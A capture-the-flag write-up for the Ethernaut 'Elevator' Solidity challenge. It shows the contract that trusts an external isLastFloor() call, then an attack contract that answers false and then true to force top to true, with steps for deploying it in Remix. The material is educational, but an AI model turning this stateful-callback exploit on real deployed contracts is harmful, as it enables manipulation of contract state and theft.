# 11 Elevator

```
This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

```

#### Start 


### (1) `reach the top of your building`


We can see that code `bool public top` defaults is false , we need to set that value `top` to true 


How do we do 

.


.

. 

It can be seen that only the ` function goTo(uint _floor) public` can set the top value, so we have to attack from here.

You can see that an external call  to the contract building and the `isLastFloor()` function is used. 

so `isLastFloor()`  the first time is must false to pass condition `if (! building.isLastFloor(_floor))`   

and the second is true to set `top = true`.


#### This is the code I used to attack contract Elevator   
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator  {
	function goTo(uint _floor) external ;
  
}
contract Building  {

    bool public firstCall;
    Elevator public target ;

    constructor(address _target)  {
      firstCall = true;
      target = Elevator(_target);
    }
   
    function isLastFloor(uint ) external returns (bool){
      if(firstCall){
        firstCall = false;
        return false;
      } else {
        return true;
      }
      
    }

    function callgoTo(uint _floor) external 
    { 
      target.goTo(_floor);
    }

}

```

- `function isLastFloor(uint ) external returns (bool)`

    This function is for the Elevator contract to be called and will return bool 

- `function callgoTo(uint _floor) external`

    This function used to call function `goTo()` in contract Elevator 


Use the remix deploy contract `Elevator`

 - (1) We will set `top = true` by calling `function callgoTo(uint _floor) external` and input `uint _floor` can be any positive number
 
   because it has no effect. and confirm transaction


Click button Submit instance and confirm transaction

# !!! we passed !!!


